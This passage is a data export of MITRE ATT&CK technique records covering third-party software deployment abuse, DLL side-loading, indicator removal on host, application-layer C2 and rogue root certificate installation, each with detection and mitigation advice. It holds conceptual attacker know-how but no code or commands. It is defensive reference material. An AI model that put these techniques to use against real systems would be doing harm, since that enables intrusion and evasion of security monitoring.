the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.\n\nAdversaries may gain access to and use third-party application deployment systems installed within an enterprise network. Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.']",[],[],[],"['Evaluate the security of third-party software that could be used to deploy or execute programs. Ensure that access to management systems for deployment systems is limited, monitored, and secure. Have a strict approval policy for use of deployment systems.\n\nGrant access to application deployment systems only to a limited number of authorized administrators. Ensure proper system and access isolation for critical network systems through use of firewalls, account privilege separation, group policy, and multifactor authentication. Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network. Patch deployment systems regularly to prevent potential remote access through [[Technique/T1068|Exploitation of Vulnerability]]. \n\nIf the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled.']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],"['Execution', 'Lateral Movement']",Technique/T1072,['Third-party Software'],https://attack.mitre.org/wiki/Technique/T1072
1580,"['Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.']","['Anti-virus', 'Process whitelisting']",[],[],"['Process use of network', 'Process monitoring', 'Loaded DLLs']","['Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests[[CiteRef::MSDN Manifests]] are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL.[[CiteRef::Stewart 2014]]\n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.']",[],[],[],['Update software regularly. Install software in write-protected locations. Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],Technique/T1073,['DLL Side-Loading'],https://attack.mitre.org/wiki/Technique/T1073
1581,['File system monitoring may be used to detect improper deletion or modification of indicator files. Events not stored on the file system will require different detection mechanisms.'],"['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['93'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['Adversaries may delete or alter generated event files on a host system, including potentially captured files such as quarantined malware. This may compromise the integrity of the security solution, causing events to go unreported, or make forensic analysis and incident response more difficult due to lack of sufficient data to determine what occurred.']",[],[],[],"['Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],Technique/T1070,['Indicator Removal on Host'],https://attack.mitre.org/wiki/Technique/T1070
1582,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.']",[],[],[],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1071,['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1583,"[""A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present.""]",['Digital Certificate Validation'],[],"['Itzik Kotler, SafeBreach']","['SSL/TLS inspection', 'Digital Certificate Logs']","[""Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.[[CiteRef::Wikipedia Root Certificate]] Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.[[CiteRef::Operation Emmental]]\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications.[[CiteRef::Kaspersky Superfish]]""]",[],[],[],['HTTP Public Key Pinning (HPKP) is one method to mitigate potential man-in-the-middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate.[[CiteRef::Wikipedia HPKP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']",['Administrator'],[],[],['Defense Evasion'],Technique/T1130,['Install Root Certificate'],https://attack.mitre.org/wiki/Technique/T1130
